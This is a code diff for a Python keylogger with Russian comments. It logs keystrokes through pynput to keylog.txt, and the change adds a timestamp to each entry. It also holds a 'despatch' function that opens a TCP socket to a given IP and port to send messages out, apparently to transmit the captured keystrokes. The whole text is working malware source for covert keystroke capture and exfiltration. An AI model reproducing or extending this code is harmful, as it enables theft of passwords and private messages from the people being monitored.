@@ -15,11 +15,16 @@ from pynput.keyboard import Listener
 
 # две функции ниже это key логгеры
 def write(key):
+    now = datetime.datetime.now()
+    current_time = now.strftime("%D:%H:%M:%S")
     keydata = str(key)
-    # print(keydata)
+    #print(keydata)
     # keydata.replace("'", " ") '''123```
     with open("keylog.txt", "a") as f:
         f.write(keydata)
+        f.write("   |")
+        f.write(current_time)
+        f.write("\n")
 
 
 def start_logger():
@@ -41,7 +46,7 @@ def despatch(ip, port, message):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     # прописываем куда будем делать коннект, адрес сервера и порт на котором он слушает
-    sock.connect((ip, port))
+    sock.connect((ip, int(port)))
 
     # далее всегда надо шифровать в байты перед посылкой, иначе ошибки
     # для отправки используем метод сокета send.
